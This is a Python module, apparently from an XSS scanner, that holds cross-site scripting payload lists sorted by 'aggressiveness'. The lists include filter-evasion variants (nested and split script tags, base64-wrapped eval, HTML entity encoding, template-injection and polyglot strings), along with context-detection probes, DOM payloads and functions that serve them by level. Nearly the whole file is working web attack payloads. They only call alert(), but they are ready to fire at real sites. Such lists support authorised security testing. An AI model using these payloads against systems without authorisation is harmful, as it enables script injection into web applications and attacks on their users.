"""
Payload Database
Built-in XSS payloads organized by category and aggressiveness level.
"""

import logging
from typing import List, Dict
from pathlib import Path

logger = logging.getLogger(__name__)


# ── Level 1: Basic probes ──────────────────────────────────
BASIC_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<svg onload=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
]

# ── Level 2: Moderate – filter evasion ─────────────────────
MODERATE_PAYLOADS = [
    '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
    '<svg/onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    "<iframe src=\"javascript:alert('XSS')\">",
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '"><svg/onload=alert("XSS")>',
    "';alert('XSS');//",
    '");alert("XSS");//',
    '<math><mtext><table><mglyph><svg><mtext>'
    '<textarea><path id="</textarea><img src=x onerror=alert(1)>">',
    '<a href="javascript:alert(1)">click</a>',
    '<div style="width:expression(alert(1))">',
]

# ── Level 3: Aggressive – advanced evasion ─────────────────
AGGRESSIVE_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '<img """><script>alert("XSS")</script>">',
    '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
    '<<script>alert("XSS");//<</script>',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<video><source onerror="javascript:alert(1)">',
    '<audio src=x onerror=alert(1)>',
    'jaVasCript:/*-/*`/*\\\\`/*\\'/*"/**/(alert(1))//',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributename=x to=1>',
]

# ── Payloads designed to detect reflection context ──────────
CONTEXT_PROBES = {
    "html_body": [
        'xss_probe_<test>',
        'xss_probe_"test"',
        "xss_probe_'test'",
        'xss_probe_`test`',
    ],
    "attribute": [
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '" onfocus="alert(1)" autofocus="',
    ],
    "javascript": [
        "';alert(1);//",
        '";alert(1);//',
        "\\\\';alert(1);//",
    ],
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
}

# ── DOM-specific payloads ──────────────────────────────────
DOM_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '#<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
]

# Unique canary for reflection detection
CANARY = "xSs_CaNaRy_7h3x"


def get_payloads(level: int = 2) -> List[str]:
    """Return payloads up to the given aggressiveness level."""
    payloads = list(BASIC_PAYLOADS)
    if level >= 2:
        payloads.extend(MODERATE_PAYLOADS)
    if level >= 3:
        payloads.extend(AGGRESSIVE_PAYLOADS)
    return payloads


def load_custom_payloads(filepath: str) -> List[str]:
    """Load user-supplied payloads from a text file (one per line)."""
    path = Path(filepath)
    if not path.exists():
        logger.warning(f"Custom payload file not found: {filepath}")
        return []

    payloads = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                payloads.append(line)

    logger.info(f"Loaded {len(payloads)} custom payloads from {filepath}")
    return payloads
